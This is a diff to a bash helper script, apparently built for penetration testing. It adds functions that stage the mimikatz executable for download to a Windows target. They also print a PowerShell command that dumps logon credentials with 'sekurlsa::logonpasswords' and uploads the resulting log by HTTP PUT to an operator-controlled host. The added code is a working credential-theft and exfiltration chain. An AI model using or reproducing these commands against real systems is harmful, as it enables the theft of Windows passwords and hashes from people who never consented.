@@ -165,3 +165,15 @@ write_ntlm_hash_to_file() {
     echo "$ntlm_hash" > "$hash_file"
 }
 
+download_mimikatz() {
+    cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+    generate_windows_download "mimikatz.exe"
+}
+
+run_mimikatz_logonpasswords() {
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log=mimikatz_logonpasswords.log
+    fi
+    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
+    echo 'iwr -Uri http://'$http_ip':'$http_port'/'"$mimikatz_log"' -Infile '"$mimikatz_log"' -Method Put;'
+}
